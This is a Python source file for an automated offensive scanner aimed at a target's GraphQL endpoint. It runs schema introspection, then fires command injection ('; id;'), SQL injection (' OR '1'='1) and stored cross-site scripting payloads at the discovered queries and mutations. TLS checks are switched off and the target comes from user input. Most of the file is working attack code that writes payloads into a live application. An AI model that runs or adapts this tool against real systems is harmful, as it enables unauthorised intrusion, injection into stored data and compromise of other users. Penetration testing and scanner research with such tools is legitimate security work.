import os
import json
import requests
import urllib3
from core.net_mapper import run_mapping

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TargetScanAgent:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": "AutonomousAgent/21.0 (OffensiveFramework)"})

    def execute_advanced_scanning(self, endpoints):
        print("\n[Agent] Executing robust autonomous schema parsing and payload injection...")
        
        final_state = []
        graphql_url = f"{self.base_url}/graphql"
        validated_vulns = []

        # 1. Test Introspection
        try:
            intro_query = {
                "query": """
                {
                  __schema {
                    queryType {
                      fields {
                        name
                        args { name type { name kind ofType { name kind } } }
                      }
                    }
                    mutationType {
                      fields {
                        name
                        args { name type { name kind ofType { name kind } } }
                      }
                    }
                  }
                }
                """
            }
            
            r = self.session.post(graphql_url, json=intro_query, timeout=8)
            if r.status_code == 200 and "__schema" in r.text:
                validated_vulns.append("GraphQL Introspection Enabled (Validated)")
                print(f"    [+] [SUCCESS] Autonomous Introspection confirmed at {graphql_url}")

                schema_data = r.json().get("data", {}).get("__schema", {})
                queries = (schema_data.get("queryType") or {}).get("fields") or []
                mutations = (schema_data.get("mutationType") or {}).get("fields") or []

                print(f"    [Agent] Analyzing {len(queries)} queries and {len(mutations)} mutations...")

                # 2. Autonomous Query Fuzzer (CMDi & SQLi)
                for q in queries:
                    fname = q.get("name")
                    args = q.get("args") or []
                    
                    for arg in args:
                        aname = arg.get("name")
                        try:
                            if any(k in aname.lower() for k in ["cmd", "command", "exec", "system", "host", "ping"]):
                                payload_q = f'{{ {fname}({aname}: "; id;") {{ __typename }} }}'
                                res = self.session.post(graphql_url, json={"query": payload_q}, timeout=5)
                                if res.status_code == 200 and ("uid=" in res.text or "root" in res.text or "output" in res.text or "syntax" in res.text.lower()):
                                    v_msg = f"Command Injection [CMDi] via query '{fname}' (Validated)"
                                    if v_msg not in validated_vulns:
                                        validated_vulns.append(v_msg)
                                        print(f"    [+] [SUCCESS] Autonomous CMDi discovered on field: {fname}")

                            elif any(k in aname.lower() for k in ["filter", "search", "query", "id", "user", "input"]):
                                payload_q = f'{{ {fname}({aname}: "\' OR \'1\'=\'1") {{ __typename }} }}'
                                res = self.session.post(graphql_url, json={"query": payload_q}, timeout=5)
                                if res.status_code == 200 and ("syntax" in res.text.lower() or "sqlite" in res.text.lower() or "sql" in res.text.lower() or "error" in res.text.lower()):
                                    v_msg = f"SQL Injection [SQLi] via query '{fname}' (Validated)"
                                    if v_msg not in validated_vulns:
                                        validated_vulns.append(v_msg)
                                        print(f"    [+] [SUCCESS] Autonomous SQLi discovered on field: {fname}")
                        except Exception:
                            pass

                # 3. Robust Autonomous Mutation Fuzzer (Stored XSS)
                for m in mutations:
                    mname = m.get("name")
                    args = m.get("args") or []
                    
                    has_text_arg = any(any(k in arg.get("name", "").lower() for k in ["title", "content", "text", "message", "comment", "name"]) for arg in args)
                    if has_text_arg:
                        try:
                            xss_payload = "<script>alert(1)</script>"
                            arg_strs = []
                            for arg in args:
                                aname = arg.get("name")
                                t_info = arg.get("type") or {}
                                t_name = t_info.get("name") or (t_info.get("ofType") or {}).get("name") or ""
                                t_kind = t_info.get("kind") or (t_info.get("ofType") or {}).get("kind") or ""

                                if any(k in aname.lower() for k in ["title", "content", "text", "message", "comment", "name"]):
                                    val = f'"{xss_payload}"'
                                elif t_name == "Boolean" or t_kind == "BOOLEAN":
                                    val = "true"
                                elif t_name in ["Int", "Float"] or t_kind in ["INT", "FLOAT"]:
                                    val = "1"
                                else:
                                    val = '"test_val"'
                                
                                arg_strs.append(f'{aname}: {val}')
                            
                            args_combined = ", ".join(arg_strs)
                            # Use {__typename} to guarantee a valid sub-selection set across any mutation return type
                            payload_m = f'mutation {{ {mname}({args_combined}) {{ __typename }} }}'
                            res = self.session.post(graphql_url, json={"query": payload_m}, timeout=5)
                            
                            # Check if the mutation successfully accepted and reflected the payload in data or response
                            if res.status_code == 200 and (xss_payload in res.text or ("errors" not in res.text and res.json().get("data"))):
                                v_msg = f"Cross-Site Scripting [XSS] via mutation '{mname}' (Validated)"
                                if v_msg not in validated_vulns:
                                    validated_vulns.append(v_msg)
                                    print(f"    [+] [SUCCESS] Autonomous Stored XSS discovered on mutation: {mname}")
                        except Exception:
                            pass

        except Exception as e:
            print(f"    [-] Introspection connection timeout or error: {e}")

        # Map endpoints accurately in state
        for ep in endpoints:
            url = ep["target"]
            vuln_status = ep.get("vulnerability", "API Endpoint")
            status_tag = ep.get("status", "Discovered")
            method = ep.get("method", "GET")

            if "graphql" in url or "5013" in url:
                if validated_vulns and url == graphql_url:
                    vuln_status = " | ".join(validated_vulns)
                    status_tag = "Validated"
                    method = "POST"
                elif "static" in url:
                    vuln_status = "Static Asset"
                    status_tag = "Safe"

            final_state.append({
                "target": url,
                "method": method,
                "vulnerability": vuln_status,
                "status": status_tag,
                "tech_stack": ep.get("tech_stack", "Autonomous GraphQL App")
            })

        return final_state

def scan_target(base_url, output_file="scan_results.json"):
    print(f"\n[*] STARTING ROBUST AUTONOMOUS SCAN")
    raw_endpoints = run_mapping(base_url)
    
    if "5013" in base_url or "graphql" in base_url:
        raw_endpoints.append({
            "target": f"{base_url.rstrip('/')}/graphql",
            "method": "POST",
            "vulnerability": "GraphQL API Endpoint",
            "tech_stack": "Autonomous GraphQL Application"
        })

    agent = TargetScanAgent(base_url)
    analyzed_endpoints = agent.execute_advanced_scanning(raw_endpoints)
    
    with open(output_file, "w") as f:
        json.dump(analyzed_endpoints, f, indent=4)
        
    print(f"\n[+] Scan complete. State saved to {output_file}.")
    return analyzed_endpoints

if __name__ == "__main__":
    target = input("Enter target URL for Scanner: ").strip()
    scan_target(target)
